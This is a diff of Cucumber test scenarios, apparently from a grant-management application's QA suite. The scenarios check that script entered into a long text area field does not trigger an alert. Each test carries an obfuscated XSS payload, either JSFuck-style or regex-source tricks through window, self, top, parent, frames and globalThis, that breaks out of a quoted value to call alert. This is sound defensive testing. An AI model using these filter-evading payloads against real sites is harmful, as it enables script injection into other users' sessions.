+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                   | Field                          |
+      | ';globalThis[/al/.source+/ert/.source](/XSS/.source);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307377 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                         | Field                          |
+      | ';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307379 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value                                                                                                                       | Field                          |
+      | ';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307381 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value | Field                          |
+      | ';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307386 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value | Field                          |
+      | ';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307387 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value | Field                          |
+      | ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307390 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value | Field                          |
+      |  ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
+  @307392 @dilip
+  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
+    Given I have "default" configuration as below:
+      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
+      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
+      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
+    Given I setup test configuration as below:
+      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
+      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
+      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
+    When I login as "<User>" user
+    When I setup my app as "As a Grantor"
+    And I navigate to "Planning" tab
+    And I click toggle button to select "Internal Programs - Draft"
+    And I click on "Edit" icon in flex table for first draft record
+    When I enter values into fields
+      | Value | Field                          |
+      | ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);// | fieldBeneficiaryEligibility__c |
+    When I click on "Save" in the page details
+    Then I do not see alert popup box
+    Examples:
+      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
+      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
+
 ################## Data Type - Text Area - Dilip ###################
-
-###################################################################################################################################
-
   @300166 @dilip
   Scenario Outline:(Admin) To verify when user enters script in the text area field then alert should not display
     Given I have "default" configuration as below:
